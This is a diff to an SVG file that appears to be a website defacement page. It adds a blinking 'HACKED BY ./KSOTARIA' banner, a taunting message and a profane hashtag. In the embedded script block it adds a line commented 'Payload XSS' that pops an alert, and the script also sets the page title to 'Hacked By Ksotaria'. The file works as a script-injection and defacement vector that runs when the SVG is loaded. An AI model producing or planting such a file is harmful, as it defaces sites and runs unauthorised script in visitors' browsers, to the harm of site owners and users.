@@ -5,7 +5,7 @@
   <foreignObject width="100%" height="100%">
     <div xmlns="http://www.w3.org/1999/xhtml" style="color:#ff0000; font-family:'Courier New',monospace; text-align:center; height:100vh; padding-top:20%;">
       
-      <h1 style="font-size: 50px; text-shadow: 0 0 15px #ff0000; margin: 0;">HACKED BY ./KSOTARIA</h1>
+      <h1 style="font-size: 50px; text-shadow: 0 0 15px #ff0000; margin: 0; animation: fastBlink 0.8s infinite;">HACKED BY ./KSOTARIA</h1>
       
       <p style="color: #ffffff; letter-spacing: 5px; font-size: 20px;">YOUR SECURITY IS AN ILLUSION</p>
       
@@ -15,11 +15,23 @@
       
       <p style="color: #444444; margin-top: 50px; font-size: 12px;">#FuckYou_Mafia</p>
 
+      <style>
+        @keyframes fastBlink {
+          0% { opacity: 1; }
+          40% { opacity: 0.2; }
+          50% { opacity: 0.9; }
+          60% { opacity: 0.1; }
+          100% { opacity: 1; }
+        }
+      </style>
     </div>
   </foreignObject>
 
   <script type="text/javascript">
     <![CDATA[
+      // Payload XSS
+      alert('ksotaria is here');
+
       try {
         document.title = "Hacked By Ksotaria";
       } catch(e) {}
